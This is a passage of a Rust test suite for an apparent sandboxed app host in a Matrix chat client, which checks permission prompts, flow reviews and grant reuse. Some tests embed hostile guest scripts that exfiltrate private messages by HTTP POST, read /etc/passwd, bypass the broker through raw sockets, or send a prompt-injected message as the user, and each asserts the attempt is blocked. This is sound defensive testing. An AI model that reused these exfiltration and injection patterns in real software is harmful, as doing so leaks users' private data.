            assert_eq!(audit.services, ["network.http"], "repeated Test clicks while awaiting permission and HTTP keep the original check busy");
        }
        let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
        app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
        assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":92,"messages":[{"body":"release today","is_own":false}]}"#]));
        host.settle_stock(&app, app_id, &mut audit);
        assert_eq!(audit.completions, [(92, true)]);
        assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants);
    }
}

#[test]
fn stock_website_session_grants_survive_retirement_and_post_a_later_new_match() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock_permissions("website-watch", false, false);
    assert!(host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]));
    assert!(host.call(&app, "toggle_post", &[]));
    assert!(host.call(&app, "save", &[]));
    host.permissions.set_matrix_write(false);
    host.flow.borrow_mut().add_sources(&context, [Source::Account { account: ACCOUNT.into() }]).unwrap();
    assert!(host.call(&app, "test_website", &[]));
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "website-watch", &mut audit);
    let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
    assert_eq!(grants, (1, 2, 1));
    app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
    host.broker.forget_app("website-watch");
    assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":301}"#]));
    host.settle_stock(&app, "website-watch", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Match posted to this room.");

    let first_epoch = host.flow.borrow().context_epoch(&context).unwrap();
    host.retire_stock(&app, &context);
    let (app, reopened) = host.launch_stock_permissions("website-watch", false, false);
    assert_eq!(reopened, context);
    assert_ne!(host.flow.borrow().context_epoch(&context).unwrap(), first_epoch);
    assert!(host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]));
    app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
    host.network_bodies.push_back("Keyword is absent in this fixture".into());
    assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":302}"#]));
    host.settle_stock(&app, "website-watch", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Keyword is absent. The next new match will be reported.");

    let second_epoch = host.flow.borrow().context_epoch(&context).unwrap();
    host.retire_stock(&app, &context);
    let (app, reopened) = host.launch_stock_permissions("website-watch", false, false);
    assert_eq!(reopened, context);
    assert_ne!(host.flow.borrow().context_epoch(&context).unwrap(), second_epoch);
    assert!(host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]));
    app.borrow_mut::<Splash>().unwrap().set_host_prompts(&mut host.cx, false);
    assert!(host.call_strings(&app, "on_background", &[r#"{"run_id":303}"#]));
    host.settle_stock(&app, "website-watch", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Match posted to this room.");
    assert_eq!(audit.completions, [(301, true), (302, true), (303, true)]);
    assert_eq!(audit.services.iter().filter(|service| service.as_str() == "matrix.room.message.send").count(), 3,
        "foreground test and both newly matched scheduled runs send the actual room-report request");
    assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants,
        "declared ability and explicit session sharing/action grants survive task instance retirement");
}

#[test]
fn stock_spaces_unjoined_room_join_and_knock_finish_and_reuse_their_grants() {
    for knocked in [false, true] {
        let mut host = Harness::new();
        let room = serde_json::json!({"room_id":"!candidate:test","name":"Candidate room","topic":"","member_count":2,"is_space":false,"joined":false});
        host.queue_matrix_reply("matrix.space.rooms.list", serde_json::json!({"rooms":[room.clone()]}));
        if !knocked {
            let mut joined = room;
            joined["joined"] = true.into();
            for _ in 0..2 { host.queue_matrix_reply("matrix.space.rooms.list", serde_json::json!({"rooms":[joined.clone()]})); }
        }
        for _ in 0..2 { host.queue_matrix_reply("matrix.rooms.join", serde_json::json!({"knocked":knocked,"room_id":"!candidate:test"})); }
        let (app, _) = host.launch_stock_permissions("spaces", false, false);
        host.boot();
        let mut audit = StockAudit::default();
        host.settle_stock(&app, "spaces", &mut audit);
        assert!(host.call(&app, "tap_item", &[0_u32.into()]));
        host.settle_stock(&app, "spaces", &mut audit);
        assert_eq!(app.widget(&host.cx, ids!(preview_line)).text(), "2 members · Public");
        assert_eq!(app.widget(&host.cx, ids!(preview_topic)).text(), "Fixture topic");
        host.broker.forget_app("spaces");
        assert!(host.call(&app, "join_room", &[]));
        host.settle_stock(&app, "spaces", &mut audit);
        let expected = if knocked { "Knocked. You're in once someone lets you in." } else { "Joined! Tap it in the list to open it." };
        assert_eq!(app.widget(&host.cx, ids!(join_note)).text(), expected);
        assert!(audit.matrix_args.contains(&"join:!candidate:test".into()));
        let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
        host.broker.forget_app("spaces");
        assert!(host.call(&app, "join_room", &[]));
        host.settle_stock(&app, "spaces", &mut audit);
        assert_eq!(app.widget(&host.cx, ids!(join_note)).text(), expected);
        assert_eq!(audit.matrix_args.iter().filter(|recipe| recipe.as_str() == "join:!candidate:test").count(), 2);
        assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants);
    }
}

#[test]
fn stock_inbox_decline_finishes_and_reuses_its_membership_grant() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("inbox", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "inbox", &mut audit);
    for index in 0..2 {
        host.broker.forget_app("inbox");
        assert!(host.call(&app, "pick_invite", &[0_u32.into()]));
        assert!(host.call(&app, "answer_invite", &[false.into()]));
        let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
        host.settle_stock(&app, "inbox", &mut audit);
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Declined the invite to Invited room");
        if index == 1 { assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants); }
    }
    assert_eq!(audit.matrix_args.iter().filter(|recipe| recipe.as_str() == "invite:!invite:test:false").count(), 2);
}

#[test]
fn stock_room_tools_other_flags_and_upgraded_room_complete_and_reuse_grants() {
    let mut host = Harness::new();
    host.queue_matrix_reply("matrix.room.successor.read", serde_json::json!({"upgraded":true,"room_id":"!successor:test"}));
    let (app, _) = host.launch_stock_permissions("room-tools", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "room-tools", &mut audit);
    for (index, on, off, recipe) in [
        (1_u32, "Marked low priority.", "Back to normal priority.", "LowPriority"),
        (2_u32, "Marked unread.", "Unread flag cleared.", "Unread"),
    ] {
        host.broker.forget_app("room-tools");
        assert!(host.call(&app, "toggle", &[index.into()]));
        host.settle_stock(&app, "room-tools", &mut audit);
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), on);
        let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
        host.broker.forget_app("room-tools");
        assert!(host.call(&app, "toggle", &[index.into()]));
        host.settle_stock(&app, "room-tools", &mut audit);
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), off);
        assert!(audit.matrix_args.contains(&format!("flag:{recipe}:true")));
        assert!(audit.matrix_args.contains(&format!("flag:{recipe}:false")));
        assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants);
    }
    assert!(app.widget(&host.cx, ids!(upgraded_wrap)).visible());
    assert!(host.call(&app, "open_successor", &[]));
    host.settle_stock(&app, "room-tools", &mut audit);
    let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
    host.broker.forget_app("room-tools");
    assert!(host.call(&app, "open_successor", &[]));
    host.settle_stock(&app, "room-tools", &mut audit);
    assert_eq!(audit.actions, ["room", "room"]);
    assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants);
}

#[test]
fn stock_inspector_pane_controls_finish_and_reuse_their_control_grant() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("inspector", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "inspector", &mut audit);
    for side in ["top", "bottom", "left", "right"] {
        host.broker.forget_app("inspector");
        assert!(host.call_json(&app, "pane_call", "ui.pane.set_side", &serde_json::json!({"side":side}).to_string()));
        host.settle_stock(&app, "inspector", &mut audit);
    }
    let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
    for service in ["ui.pane.break_out", "ui.pane.minimize", "ui.pane.restore"] {
        host.broker.forget_app("inspector");
        assert!(host.call_strings(&app, "pane_call", &[service]));
        host.settle_stock(&app, "inspector", &mut audit);
    }
    host.broker.forget_app("inspector");
    assert!(host.call(&app, "minimize_briefly", &[]));
    host.settle_stock(&app, "inspector", &mut audit);
    host.boot(); // Dispatch the actual saved restore timer without a wall-clock sleep.
    host.settle_stock(&app, "inspector", &mut audit);
    host.broker.forget_app("inspector");
    assert!(host.call_strings(&app, "pane_call", &["ui.pane.close"]));
    host.settle_stock(&app, "inspector", &mut audit);
    assert_eq!(audit.actions, ["side", "side", "side", "side", "break_out", "minimize", "restore", "minimize", "restore", "close"]);
    assert_eq!(app.widget(&host.cx, ids!(pane_state)).text(), "On screen · 460 × 700");
    assert_eq!(app.widget(&host.cx, ids!(pane_err)).text(), "", "every pane control succeeded");
    assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants);
}

#[test]
fn stock_search_all_rooms_and_server_variants_finish_and_reuse_their_read_grant() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock_permissions("search", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "search", &mut audit);
    assert!(host.call_strings(&app, "set_mode", &["all"]));
    for server in [false, true] {
        host.widget_click(&app, "Ask the server too", &[server.into()]);
        for index in 0..2 {
            host.broker.forget_app("search");
            assert!(host.call_strings(&app, "run_search", &["release"]));
            let grants = (audit.prompts.len(), audit.reviews, audit.write_setups);
            host.settle_stock(&app, "search", &mut audit);
            assert!(audit.matrix_args.contains(&format!("search:all:{server}")));
            assert_eq!(app.widget(&host.cx, ids!(status)).text(), if server { "1 result in 1 room · server included" } else { "1 result in 1 room" });
            if index == 1 { assert_eq!((audit.prompts.len(), audit.reviews, audit.write_setups), grants); }
        }
    }
    assert_eq!(audit.services.iter().filter(|service| service.as_str() == "matrix.rooms.messages.search").count(), 4);
}

#[test]
fn stock_room_stats_search_and_room_tools_show_sender_names_or_fall_back_to_the_localpart() {
    fn shows(root: &WidgetRef, text: &str) -> bool {
        if root.text() == text { return true; }
        let mut children = Vec::new();
        root.children(&mut |_, child| children.push(child));
        children.iter().any(|child| shows(child, text))
    }
    // Older hosts omit sender_name, so the second row must fall back to its localpart.
    let named = serde_json::json!({"event_id":"$named:test","room_id":ROOM,"room_name":"Private room","sender":"alice","sender_id":"@alice:test","sender_name":"Alice Liddell","body":"release named","ts":1720000000000_u64});
    let plain = serde_json::json!({"event_id":"$plain:test","room_id":ROOM,"room_name":"Private room","sender":"bob","sender_id":"@bob:test","body":"release plain","ts":1720000060000_u64});
    for (app_id, capability, data, expected) in [
        ("room-stats", "matrix.room.messages.read", serde_json::json!({"messages":[named.clone(), plain.clone()]}), ["Alice Liddell", "bob"]),
        ("room-tools", "matrix.room.messages.read", serde_json::json!({"messages":[named.clone(), plain.clone()]}), ["Alice Liddell", "bob"]),
        ("search", "matrix.rooms.messages.search", serde_json::json!({"results":[named.clone(), plain.clone()],"server_used":false}),
            ["Alice Liddell · Private room", "bob · Private room"]),
    ] {
        let mut host = Harness::new();
        host.queue_matrix_reply(capability, data);
        let (app, _) = host.launch_stock_permissions(app_id, false, false);
        host.boot();
        let mut audit = StockAudit::default();
        host.settle_stock(&app, app_id, &mut audit);
        if app_id == "search" {
            assert!(host.call_strings(&app, "set_mode", &["all"]));
            assert!(host.call_strings(&app, "run_search", &["release"]));
            host.settle_stock(&app, app_id, &mut audit);
        }
        for name in expected { assert!(shows(&app, name), "{app_id} shows {name}"); }
    }
}

#[test]
fn stock_account_management_reviews_the_browser_origin_and_finishes_its_original_callback() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock_permissions("account", false, false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "account", &mut audit);
    assert!(app.widget(&host.cx, ids!(manage_wrap)).visible());
    // Strict mode asks before normally auto-granted browser abilities and
    // keeps the original callback alive through ability + flow review.
    host.permissions.set_strict(true);
    host.permissions.set("account", Permission::OpenUrl, GrantState::Ask);
    host.publish_grants(&app, "account");
    assert!(host.call(&app, "open_manage", &[]));
    let mut parked = None;
    for ask in host.process() {
        match ask {
            BrokerAsk::Prompt { app_id, perm: Permission::OpenUrl, request: Some(request), .. } => {
                assert_eq!(app_id, "account");
                assert!(parked.replace(request).is_none());
                audit.prompts.push(Permission::OpenUrl);
            }
            BrokerAsk::Used { .. } => {},
            BrokerAsk::Prompt { perm, request, .. } => panic!("unexpected permission {perm:?} with original {}", request.map(|request| request.service).unwrap_or_default()),
            BrokerAsk::FlowReview { review, .. } => panic!("Account browser ability already granted; flow review allowed={} group={:?}", review.allowed, host.permissions.state("account", Permission::OpenUrl)),
            _ => panic!("Account Manage must first request its declared browser ability"),
        }
    }
    host.permissions.set("account", Permission::OpenUrl, GrantState::Granted);
    host.publish_grants(&app, "account");
    let (request, review) = effect_review(host.dispatch(Some(parked.expect("original Account Manage request is parked"))));
    audit.reviews += 1;
    let args: serde_json::Value = serde_json::from_str(&request.args_json).unwrap();
    assert_eq!(args["url"], "https://homeserver.test/account?tab=profile");
    assert_eq!(review.recipient, Some(Recipient::network_origin("https://homeserver.test").unwrap()));
    assert_eq!(review.action.as_ref().unwrap().kind, "device.url.open");
    assert_eq!(review.action.as_ref().unwrap().target, "https://homeserver.test");
    assert!(review.payload.contains("https://homeserver.test/account?tab=profile"));
    assert!(review.sources.contains(&Source::Account { account: ACCOUNT.into() }));
    host.flow.borrow_mut().approve_effect_session(&review, SharingDuration::RobrixSession).unwrap();
    host.flow.borrow_mut().commit_effect_for_activation(&context, review.epoch, review.recipient.as_ref(), review.action.as_ref(), &args).unwrap();
    // The real broker opens the native browser immediately after this gate.
    // Fixture its completion so integration tests never launch an external app.
    let outcome = makepad_widgets::splash_host::splash_host_respond(&mut host.cx, request.heap_key, request.req_id, Ok("{}"));
    assert_eq!(outcome, makepad_widgets::splash_host::SplashRespondOutcome::Delivered);
    host.settle_stock(&app, "account", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(server_line)).text(), "https://homeserver.test");

    let grants = (audit.prompts.len(), audit.reviews, host.flow.borrow().authorities().unwrap());
    assert!(host.call(&app, "open_manage", &[]));
    let requests = makepad_widgets::splash_host::take_splash_host_requests();
    assert_eq!(requests.len(), 1);
    let request = &requests[0];
    assert_eq!(request.service, "url.open");
    let args: serde_json::Value = serde_json::from_str(&request.args_json).unwrap();
    let cap = a2app_core::capabilities::for_service(&request.service).unwrap();
    assert_eq!(host.permissions.effective_capability_in_context(host.apps.get("account").unwrap(), cap,
        services::permission_context(&request.service, &args, context.room())), a2app_core::permissions::Effective::Granted);
    let contract = cap.flow_contract().unwrap();
    let recipient = contract.recipient(ACCOUNT, None, &args, Some("https://homeserver.test")).unwrap();
    let action = contract.sensitive_action(cap.id, &args, None);
    let epoch = host.flow.borrow().context_epoch(&context).unwrap();
    let reviewed = host.flow.borrow_mut().prepare_effect_for_activation(&context, epoch, recipient.as_ref(), action.as_ref(), &args).unwrap();
    assert!(reviewed.allowed, "same exact browser origin and action use the approved session");
    host.flow.borrow_mut().commit_effect_for_activation(&context, epoch, recipient.as_ref(), action.as_ref(), &args).unwrap();
    let outcome = makepad_widgets::splash_host::splash_host_respond(&mut host.cx, request.heap_key, request.req_id, Ok("{}"));
    assert_eq!(outcome, makepad_widgets::splash_host::SplashRespondOutcome::Delivered);
    host.settle_stock(&app, "account", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(server_line)).text(), "https://homeserver.test");
    assert_eq!((audit.prompts.len(), audit.reviews, host.flow.borrow().authorities().unwrap()), grants);
}

#[test]
fn stock_account_lookup_of_an_unknown_user_hides_its_dm_line() {
    let mut host = Harness::new();
    let (app, _) = host.launch_stock("account", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "account", &mut audit);
    assert!(host.call_strings(&app, "lookup", &["@nobody:test"]));
    let (mut profile, mut dm) = (None, None);
    for _ in 0..4 {
        let mut pending: VecDeque<_> = host.process().into();
        while let Some(ask) = pending.pop_front() { match ask {
            BrokerAsk::Matrix { reply, call: services::MatrixServiceCall::UserProfile { .. }, .. } => profile = Some(reply),
            BrokerAsk::Matrix { reply, call: services::MatrixServiceCall::DmFind { .. }, .. } => dm = Some(reply),
            BrokerAsk::FlowReview { request, review } => {
                host.flow.borrow_mut().approve_effect_session(&review, SharingDuration::RobrixSession).unwrap();
                pending.extend(host.dispatch(Some(request)));
            }
            BrokerAsk::Used { .. } => {},
            _ => panic!("unexpected account lookup request"),
        } }
        if profile.is_some() && dm.is_some() { break; }
    }
    // The empty DM answer lands first; the profile's "not found" must still hide it.
    host.reply(dm.expect("the lookup checks for a DM"), r#"{"room_id":null,"name":null}"#);
    let profile = profile.expect("the lookup reads the profile");
    host.guest_work(profile.heap_key, |cx| services::respond(cx, profile, Err("M_NOT_FOUND: Profile was not found")));
    host.settle_stock(&app, "account", &mut audit);
    assert_eq!(app.widget(&host.cx, ids!(lookup_err)).text(), "No one with that user id was found.");
    assert!(!app.widget(&host.cx, ids!(result_wrap)).visible(), "an unknown user gets no \"No direct message\" card");
}

#[test]
fn stock_website_test_explains_malformed_saved_urls_before_requesting_permission() {
    for invalid in ["example.com", "https://alice:secret@example.com/", "ftp://example.com/"] {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock_permissions("website-watch", false, false);
        assert!(host.call(&app, "on_app_resize", &[460_f64.into(), 700_f64.into()]));
        app.text_input(&host.cx, ids!(url_input)).set_text(&mut host.cx, invalid);
        assert!(host.call(&app, "save", &[]));
        assert!(host.call(&app, "test_website", &[]));
        for _ in 0..3 { assert!(host.process().is_empty(), "{invalid} cannot raise a permission prompt or perform HTTP"); }
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Enter a complete website address starting with http:// or https://, without a username or password.");
        assert!(!host.stock_callbacks_paused());
        host.assert_callback_errors(invalid);
        let failures = host.broker.failures();
        assert_eq!(failures.len(), 1);
        assert_eq!(failures[0].error, app.widget(&host.cx, ids!(status)).text());
        assert_eq!(host.permissions.state("website-watch", Permission::Network), GrantState::Ask);
        app.text_input(&host.cx, ids!(url_input)).set_text(&mut host.cx, "https://example.com/");
        assert!(host.call(&app, "save", &[]));
        assert!(host.call(&app, "test_website", &[]));
        let mut audit = StockAudit::default();
        host.settle_stock(&app, "website-watch", &mut audit);
        assert_eq!(audit.services, ["network.http"]);
        assert_eq!(audit.notifications.len(), 1);
        assert!(audit.completions.is_empty());
        assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Keyword found. Test report shown in a Robrix popup.");
    }
}

#[test]
fn stock_room_tools_captures_exact_clipboard_contents_for_review_before_native_work() {
    let mut host = Harness::new();
    let (app, context) = host.launch_stock("room-tools", false);
    host.boot();
    let mut audit = StockAudit::default();
    host.settle_stock(&app, "room-tools", &mut audit);
    assert!(host.call(&app, "copy_latest", &[]));
    let reply = matrix_reply(host.process());
    host.reply(reply, r#"{"url":"https://matrix.to/#/!private:test/$message:test"}"#);
    host.cx.with_vm_and_async(|_| {});
    let (request, review) = effect_review(host.process());
    assert_eq!(request.service, "clipboard.write");
    assert_eq!(review.recipient, Some(Recipient::Clipboard));
    assert!(review.payload.contains("https://matrix.to/#/!private:test/$message:test"));
    host.flow.borrow_mut().approve_effect_once(&review).unwrap();
    host.flow.borrow_mut().commit_effect_for_activation(&context, review.epoch, review.recipient.as_ref(), review.action.as_ref(),
        &serde_json::from_str(&request.args_json).unwrap()).unwrap();
    // Fixture the native clipboard result: running the real clipboard writer
    // here would overwrite the developer's clipboard from a test.
    host.reply(Reply { heap_key: request.heap_key, req_id: request.req_id }, "{}");
    host.cx.with_vm_and_async(|_| {});
    let args: serde_json::Value = serde_json::from_str(&request.args_json).unwrap();
    assert_eq!(args["text"], "https://matrix.to/#/!private:test/$message:test");
    assert_eq!(app.widget(&host.cx, ids!(status)).text(), "Latest message link copied.");
}

#[test]
fn stock_live_apps_resubscribe_after_revocation_and_regrant_without_prompting_again() {
    for (app_id, permission) in [
        ("room-peek", Permission::MatrixRoomWatch), ("room-members", Permission::MatrixRoomWatch),
        ("room-pins", Permission::MatrixRoomInfo), ("room-threads", Permission::MatrixRoomWatch),
        ("presence", Permission::MatrixRoomWatch), ("watcher", Permission::MatrixRoomWatch),
        ("simple-watcher", Permission::MatrixRoomWatch),
        ("inbox", Permission::MatrixRoomsList), ("inspector", Permission::RobrixObserve),
        ("link-library", Permission::MatrixRoomWatch), ("room-gallery", Permission::MatrixRoomWatch),
        ("translator", Permission::MatrixRoomWatch),
    ] {
        let mut host = Harness::new();
        let (app, _) = host.launch_stock(app_id, false);
        host.boot();
        let mut audit = StockAudit::default();
        host.settle_stock(&app, app_id, &mut audit);
        if app_id == "translator" {
            // Live translation is off by default; its toggle adds the hook.
            assert!(host.call(&app, "set_live", &[true.into()]));
            host.settle_stock(&app, app_id, &mut audit);
        }
        let hooks = audit.subscriptions.clone();
        assert!(!hooks.is_empty());
        host.permissions.set(app_id, permission, GrantState::Denied);
        host.publish_grants(&app, app_id);
        host.settle_stock(&app, app_id, &mut audit);
        if matches!(app_id, "watcher" | "simple-watcher") {
            assert!(app.widget(&host.cx, ids!(status)).text().starts_with("Not watching: permission is off."));
        }
        let before = audit.subscriptions.len();
        // Production prunes denied hooks at this point. Restore just that
        // group; guest-side idempotence must allow fresh subscriptions.
        host.permissions.set(app_id, permission, GrantState::Granted);
        host.publish_grants(&app, app_id);
        host.settle_stock(&app, app_id, &mut audit);
        let restored = &audit.subscriptions[before..];
        assert!(!restored.is_empty(), "{app_id} must resume its live updates after regrant");
        assert!(restored.iter().all(|hook| hooks.contains(hook)));
        assert!(audit.prompts.is_empty());
        if matches!(app_id, "watcher" | "simple-watcher") {
            assert!(app.widget(&host.cx, ids!(status)).text().starts_with("Watching this room."));
        }
    }
}

#[test]
fn private_read_encoded_output_and_storage_restart_keep_the_source() {
    let mut host = Harness::new();
    let (heap, context) = host.launch("encoded", false, r#"
        host.request("matrix.read_messages", {}, fn(r) {
            let secret = r.data.messages[0].body
            fs.write("/saved", secret)
            host.request("network.http", {url:"https://example.test/" method:"POST" body:secret.to_chars().to_json()}, fn(out) {
                host.request("notify.post", {body:if out.is_ok {"escaped"} else {"blocked"}})
            })
        })
        Label{text:"fixture"}
    "#);
    let read = matrix_reply(host.process());
    host.reply(read, r#"{"messages":[{"body":"secret"}]}"#);
    assert!(host.process().into_iter().all(|ask| !matches!(ask, BrokerAsk::Network { .. })));
    assert_eq!(host.notifications(), ["blocked"]);
    assert_eq!(*host.attempted_bodies.borrow(), ["[115,101,99,114,101,116]"]);
    assert!(host.flow.borrow().labels(&context).unwrap().contains(&Source::Room { account: ACCOUNT.into(), room: ROOM.into() }));
    host.stop(heap);
    // Reopen both the persisted policy store and actual filesystem-backed VM.
    host.flow = RefCell::new(Registry::open(&host.root).unwrap());
    host.launch("encoded", false, r#"
        host.request("network.http", {url:"https://example.test/" body:fs.read("/saved")}, fn(out) {
            host.request("notify.post", {body:if out.is_ok {"escaped"} else {"blocked after restart"}})
        })
        Label{text:"fixture"}
    "#);
    assert!(host.process().into_iter().all(|ask| !matches!(ask, BrokerAsk::Network { .. })));
    assert_eq!(host.notifications(), ["blocked after restart"]);
}

#[test]
fn queued_request_observes_current_sharing_revocation() {
    let mut host = Harness::new();
    let (_, context) = host.launch("queued", false, r#"
        fn send() {
            host.request("network.http", {url:"https://example.test/"}, fn(out) {
                host.request("notify.post", {body:if out.is_ok {"escaped"} else {"revoked"}})
            })
        }
        Label{text:"fixture"}
    "#);
    let source = Source::Room { account: ACCOUNT.into(), room: ROOM.into() };
    host.flow.borrow_mut().add_sources(&context, [source.clone()]).unwrap();
    host.flow.borrow_mut().set_policy(source.clone(), FlowPolicy { recipients: [Recipient::network_origin(SITE).unwrap()].into_iter().collect() }).unwrap();
    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(send), &[]));
    host.flow.borrow_mut().set_policy(source, FlowPolicy::default()).unwrap();
    assert!(host.process().into_iter().all(|ask| !matches!(ask, BrokerAsk::Network { .. })));
    assert_eq!(host.notifications(), ["revoked"]);
}

#[test]
fn public_post_has_no_receiver_or_delivery_receipt_and_private_return_is_blocked() {
    let mut host = Harness::new();
    let (public_heap, public) = host.launch("fetcher", true, r#"
        fn on_ipc_message(json) { host.request("notify.post", {body:"private payload escaped"}) }
        fn post() {
            host.request("ipc.post", {to:"combiner" data:{weather:"sunny"}}, fn(r) {
                host.request("notify.post", {body:r.data.to_json()})
            })
            host.request("ipc.post", {to:"missing" data:{}}, fn(r) {
                host.request("notify.post", {body:r.data.to_json()})
            })
            host.request("ipc.post", {to:"blocked" data:{}}, fn(r) {
                host.request("notify.post", {body:r.data.to_json()})
            })
        }
        Label{text:"public"}
    "#);
    let (_, private) = host.launch("combiner", false, r#"
        fn on_ipc_message(json) { host.request("notify.post", {body:"public payload delivered"}) }
        fn reply() {
            host.request("ipc.post", {to:"fetcher" data:"private payload"}, fn(r) {
                host.request("notify.post", {body:r.data.to_json()})
            })
        }
        Label{text:"private"}
    "#);
    host.launch("blocked", false, "Label{text:\"closed inbox\"}");
    host.permissions.set("blocked", Permission::Ipc, GrantState::Denied);
    host.flow.borrow_mut().add_sources(&private, [Source::Room { account: ACCOUNT.into(), room: ROOM.into() }]).unwrap();
    host.flow.borrow_mut().add_influences(&public, [Influence::InternetOrigin("https://weather.test".into())]).unwrap();
    assert!(host.splashes[0].call_script_fn(&mut host.cx, id!(post), &[]));
    let asks = host.process();
    let deliveries = asks.into_iter().filter_map(|ask| match ask {
        BrokerAsk::IpcDeliver { receipt, data_json, to, .. } => { assert!(!receipt); Some((to, data_json)) }
        _ => None,
    }).collect::<Vec<_>>();
    assert_eq!(deliveries.len(), 1);
    assert_eq!(deliveries[0].0, "combiner");
    let delivery = &deliveries[0].1;
    assert_eq!(host.notifications(), ["{\"accepted\":true}", "{\"accepted\":true}", "{\"accepted\":true}"]);
    // The host-resolved IPC delivery boundary, used before actual script hook entry.
    host.flow.borrow_mut().transfer(&public, &private).unwrap();
    assert!(host.splashes[1].call_script_fn_with_strings(&mut host.cx, id!(on_ipc_message), &[delivery]));
    assert_eq!(host.notifications(), ["public payload delivered"]);
    assert!(host.splashes[1].call_script_fn(&mut host.cx, id!(reply), &[]));
    let reverse = host.process();
    assert!(reverse.into_iter().any(|ask| matches!(ask, BrokerAsk::IpcDeliver { receipt: false, to, .. } if to == "fetcher")));
    assert!(host.flow.borrow_mut().transfer(&private, &public).is_err());
    assert_eq!(host.notifications(), ["{\"accepted\":true}"]);
    assert!(host.flow.borrow().labels(&public).unwrap().is_empty());
    assert!(host.flow.borrow().influences(&private).unwrap().contains(&Influence::InternetOrigin("https://weather.test".into())));
    assert!(host.contexts.contains_key(&public_heap));
}

#[test]
fn unknown_service_is_refused_before_host_side_effects() {
    let mut host = Harness::new();
    host.launch("unclassified", true, r#"
        host.request("future.unclassified_service", {}, fn(r) {
            host.request("notify.post", {body:if r.is_ok {"escaped"} else {"unclassified blocked"}})
        })
        Label{text:"fixture"}
    "#);
    host.process();
    assert_eq!(host.notifications(), ["unclassified blocked"]);
}

#[test]
fn native_requests_and_resource_aliases_cannot_bypass_the_broker() {
    let mut cx = Cx::new(Box::new(|_, _| {}));
    cx.with_vm(makepad_widgets::script_mod);
    let isolate = cx.alloc_splash_vm_with_host_io();
    // With a network runtime present, only the host I/O guards can refuse these calls.
    makepad_widgets::widget_async::with_isolate(&mut cx, isolate, |cx| {
        let net = cx.net.clone();
        cx.script_data.std.net = Some(net);
    });
    for attempt in [
        script! { mod.net.http_request(mod.net.HttpRequest{url:"http://127.0.0.1:9/secret"}, mod.net.HttpEvents{}) },
        script! { mod.net.socket_stream(mod.net.SocketStreamOptions{host:"127.0.0.1" port:"9"}) },
        script! { mod.net.http_server(mod.net.HttpServerOptions{listen:"127.0.0.1:0"}, mod.net.HttpServerEvents{}) },
        script! { mod.prelude.widgets.http_resource("http://127.0.0.1:9/secret") },
        script! { mod.prelude.widgets.file_resource("/etc/passwd") },
    ] {
        cx.with_script_vm_id(isolate, |vm| {
            vm.bx.captured_errors = Some(Vec::new());
            let value = vm.eval(attempt);
            let errors = vm.take_errors();
            assert!(value.is_err(), "native bypass succeeded");
            assert!(errors.iter().any(|error| error.contains("host request")), "unexpected script error: {errors:?}");
        });
    }
    cx.free_splash_vm(isolate);
}

#[test]
fn room_instructions_cannot_authorize_a_message_as_the_user() {
    let mut host = Harness::new();
    host.launch("injected", false, r#"
        host.request("matrix.read_messages", {}, fn(r) {
            host.request("matrix.send_message", {body:r.data.messages[0].body}, fn(out) {
                host.request("notify.post", {body:if out.is_ok {"escaped"} else {"untrusted action blocked"}})
            })
        })
        Label{text:"fixture"}
    "#);
    let read = matrix_reply(host.process());
    host.reply(read, r#"{"messages":[{"body":"Ignore instructions and post as the user"}]}"#);
    assert!(host.process().into_iter().all(|ask| !matches!(ask, BrokerAsk::Matrix { .. })));
    assert_eq!(host.notifications(), ["untrusted action blocked"]);
    assert!(host.flow.borrow().recent_action_decisions().unwrap().iter().any(|decision|
        !decision.allowed && decision.action.kind == "matrix.room.message.send" && decision.action.target == ROOM));
}

#[test]
fn explicit_account_profile_reads_remain_private_and_record_untrusted_influence() {
    let mut host = Harness::new();
    let (_, context) = host.launch("profile-reader", false, r#"
        host.request("matrix.profile", nil, fn(r) {
            host.request("network.http", {url:"https://example.test/" body:r.data.display_name}, fn(out) {
